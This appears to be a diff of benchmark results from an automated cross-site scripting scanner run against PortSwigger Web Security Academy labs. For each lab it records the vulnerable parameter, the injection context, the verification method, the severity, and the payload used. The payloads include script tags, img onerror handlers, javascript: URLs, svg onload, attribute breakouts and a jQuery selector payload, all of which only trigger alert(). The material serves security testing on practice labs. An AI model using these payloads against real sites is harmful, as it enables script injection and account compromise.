@@ -4,79 +4,46 @@
     "path": "cross-site-scripting/reflected/lab-html-context-nothing-encoded",
     "diff": "APPRENTICE",
     "fam": "reflected-html",
-    "instance": "https://0ae000aa04bba74f802dbc920021005f.web-security-academy.net",
+    "instance": "https://0a6f004d03693974805794d5006e00c0.web-security-academy.net",
     "findings": [
       {
         "param": "search",
         "ctx": "html_text",
         "verified_by": "browser",
         "sev": "medium",
-        "payload": "<script>alert('ixm055cc2ce')</script>",
-        "page": "https://0ae000aa04bba74f802dbc920021005f.web-security-academy.net/"
+        "payload": "<script>alert('ixm02a2c116')</script>",
+        "page": "https://0a6f004d03693974805794d5006e00c0.web-security-academy.net/"
       },
       {
         "param": "content",
         "ctx": "html_text",
         "verified_by": "browser",
         "sev": "high",
-        "payload": "<img src=x onerror=alert('ixmc88cdbbd')>",
-        "page": "https://0ae000aa04bba74f802dbc920021005f.web-security-academy.net/"
-      },
-      {
-        "param": "website",
-        "ctx": "html_attr_href",
-        "verified_by": "reflection",
-        "sev": "medium",
-        "payload": "javascript:alert('ixme2b5037b')",
-        "page": "https://0ae000aa04bba74f802dbc920021005f.web-security-academy.net/post?postId=5"
+        "payload": "<img src=x onerror=alert('ixmdd556b42')>",
+        "page": "https://0a6f004d03693974805794d5006e00c0.web-security-academy.net/"
       }
     ],
-    "requests": 35,
+    "requests": 47,
     "status": "ok",
-    "secs": 121.5
+    "secs": 208.6
   },
   {
     "i": 1,
     "path": "cross-site-scripting/stored/lab-html-context-nothing-encoded",
     "diff": "APPRENTICE",
     "fam": "stored-html",
-    "instance": "https://0aa900240482114a81ae84b100770004.web-security-academy.net",
-    "findings": [
-      {
-        "param": "comment",
-        "ctx": "js_in_attr",
-        "verified_by": "browser",
-        "sev": "high",
-        "payload": "<img src=x onerror=alert('ixm4c5ca56d')>",
-        "page": "https://0aa900240482114a81ae84b100770004.web-security-academy.net/post?postId=10"
-      },
-      {
-        "param": "name",
-        "ctx": "html_text",
-        "verified_by": "browser",
-        "sev": "high",
-        "payload": "<img src=x onerror=alert('ixm0fc209d4')>",
-        "page": "https://0aa900240482114a81ae84b100770004.web-security-academy.net/post?postId=10"
-      },
-      {
-        "param": "website",
-        "ctx": "html_attr_href",
-        "verified_by": "reflection",
-        "sev": "medium",
-        "payload": "javascript:alert('ixm73248231')",
-        "page": "https://0aa900240482114a81ae84b100770004.web-security-academy.net/post?postId=10"
-      }
-    ],
-    "requests": 34,
+    "instance": "https://0a8b0008046f515381e23e7b003900f9.web-security-academy.net",
+    "findings": [],
+    "requests": 43,
     "status": "ok",
-    "secs": 91.4
+    "secs": 200.0
   },
   {
     "i": 2,
     "path": "cross-site-scripting/dom-based/lab-document-write-sink",
     "diff": "APPRENTICE",
     "fam": "dom-document.write",
-    "instance": "https://0a0f00040413e14481ecf21e00350077.web-security-academy.net",
+    "instance": "https://0a350061039fb1da80e5d04b00940059.web-security-academy.net",
     "findings": [
       {
         "param": "search",
@@ -84,27 +51,19 @@
         "verified_by": "browser",
         "sev": "high",
         "payload": "x\"%09onload%3D\"alert('ixm06a943c5')\"%09x=\"",
-        "page": "https://0a0f00040413e14481ecf21e00350077.web-security-academy.net/"
-      },
-      {
-        "param": "website",
-        "ctx": "html_attr_href",
-        "verified_by": "reflection",
-        "sev": "medium",
-        "payload": "javascript:alert('ixm49f699a8')",
-        "page": "https://0a0f00040413e14481ecf21e00350077.web-security-academy.net/post?postId=5"
+        "page": "https://0a350061039fb1da80e5d04b00940059.web-security-academy.net/"
       }
     ],
-    "requests": 36,
+    "requests": 48,
     "status": "ok",
-    "secs": 148.0
+    "secs": 219.5
   },
   {
     "i": 3,
     "path": "cross-site-scripting/dom-based/lab-innerhtml-sink",
     "diff": "APPRENTICE",
     "fam": "dom-innerhtml",
-    "instance": "https://0ad8004d0354274c80c503a7005d000e.web-security-academy.net",
+    "instance": "https://0a8a0044031f5c5481178403006e0070.web-security-academy.net",
     "findings": [
       {
         "param": "search",
@@ -112,112 +71,80 @@
         "verified_by": "browser",
         "sev": "high",
         "payload": "</select><svg%20onload%3Dalert('ixm06a943c5')>",
-        "page": "https://0ad8004d0354274c80c503a7005d000e.web-security-academy.net/"
+        "page": "https://0a8a0044031f5c5481178403006e0070.web-security-academy.net/"
       },
       {
         "param": "content",
         "ctx": "html_text",
         "verified_by": "browser",
         "sev": "high",
-        "payload": "<img src=x onerror=alert('ixm60d6f7a5')>",
-        "page": "https://0ad8004d0354274c80c503a7005d000e.web-security-academy.net/"
-      },
-      {
-        "param": "website",
-        "ctx": "html_attr_href",
-        "verified_by": "reflection",
-        "sev": "medium",
-        "payload": "javascript:alert('ixm68ef2a2e')",
-        "page": "https://0ad8004d0354274c80c503a7005d000e.web-security-academy.net/post?postId=5"
+        "payload": "<img src=x onerror=alert('ixma45e3910')>",
+        "page": "https://0a8a0044031f5c5481178403006e0070.web-security-academy.net/"
       }
     ],
-    "requests": 32,
+    "requests": 44,
     "status": "ok",
-    "secs": 121.7
+    "secs": 203.6
   },
   {
     "i": 4,
     "path": "cross-site-scripting/dom-based/lab-jquery-href-attribute-sink",
     "diff": "APPRENTICE",
     "fam": "dom-jquery-href",
-    "instance": "https://0a98001704c018eb81a06bd300da00d5.web-security-academy.net",
+    "instance": "https://0a790074038530ed81c5d457002e00e8.web-security-academy.net",
     "findings": [
       {
         "param": "returnPath",
         "ctx": "html_text",
-        "verified_by": "browser",
-        "sev": "high",
-        "payload": "javascript:alert('ixmf5d7a03f')",
-        "page": "https://0a98001704c018eb81a06bd300da00d5.web-security-academy.net/"
-      },
-      {
-        "param": "website",
-        "ctx": "html_attr_href",
-        "verified_by": "reflection",
+        "verified_by": "static",
         "sev": "medium",
-        "payload": "javascript:alert('ixmd9c37b71')",
-        "page": "https://0a98001704c018eb81a06bd300da00d5.web-security-academy.net/post?postId=3"
+        "payload": "alert('ixmf5d7a03f')",
+        "page": "https://0a790074038530ed81c5d457002e00e8.web-security-academy.net/"
       }
     ],
-    "requests": 32,
+    "requests": 44,
     "status": "ok",
-    "secs": 134.4
+    "secs": 200.2
   },
   {
     "i": 5,
     "path": "cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event",
     "diff": "APPRENTICE",
     "fam": "dom-jquery-selector",
-    "instance": "https://0a7900bd03ee05e080fc033a00f000be.web-security-academy.net",
+    "instance": "https://0a2f003403306d0181ccb6470021003c.web-security-academy.net",
     "findings": [
       {
         "param": "#fragment",
         "ctx": "url_fragment",
         "verified_by": "browser",
         "sev": "high",
-        "payload": "x:has(<img src=x onerror=alert('ixm51601632')>)",
-        "page": "https://0a7900bd03ee05e080fc033a00f000be.web-security-academy.net/"
-      },
-      {
-        "param": "website",
-        "ctx": "html_attr_href",
-        "verified_by": "reflection",
-        "sev": "medium",
-        "payload": "javascript:alert('ixm2c468586')",
-        "page": "https://0a7900bd03ee05e080fc033a00f000be.web-security-academy.net/post?postId=4"
+        "payload": "x:has(<img src=x onerror=alert('ixm61163024')>)",
+        "page": "https://0a2f003403306d0181ccb6470021003c.web-security-academy.net/"
       }
     ],
-    "requests": 44,
+    "requests": 48,
     "status": "ok",
-    "secs": 116.5
+    "secs": 198.7
   },
   {
     "i": 6,
     "path": "cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded",
     "diff": "APPRENTICE",
     "fam": "attr-double",
-    "instance": "https://0aa1000c04f9d262804d499e00c7004a.web-security-academy.net",
+    "instance": "https://0ac70057039cf24c800b03070078001c.web-security-academy.net",
     "findings": [
       {
         "param": "search",
         "ctx": "html_attr_double",
         "verified_by": "browser",
         "sev": "medium",
-        "payload": "\"onfocus=alert('ixm35fc4a56') autofocus x=\"",
-        "page": "https://0aa1000c04f9d262804d499e00c7004a.web-security-academy.net/"
-      },
-      {
-        "param": "website",
-        "ctx": "html_attr_href",
-        "verified_by": "reflection",
-        "sev": "medium",
-        "payload": "javascript:alert('ixmeafd8028')",
-        "page": "https://0aa1000c04f9d262804d499e00c7004a.web-security-academy.net/post?postId=5"
+        "payload": "\"onfocus=alert('ixm07a82edb') autofocus x=\"",
+        "page": "https://0ac70057039cf24c800b03070078001c.web-security-academy.net/"
       }
     ],
-    "requests": 37,
+    "requests": 49,
     "status": "ok",
-    "secs": 146.0
+    "secs": 214.8
   },
   {
     "i": 7,
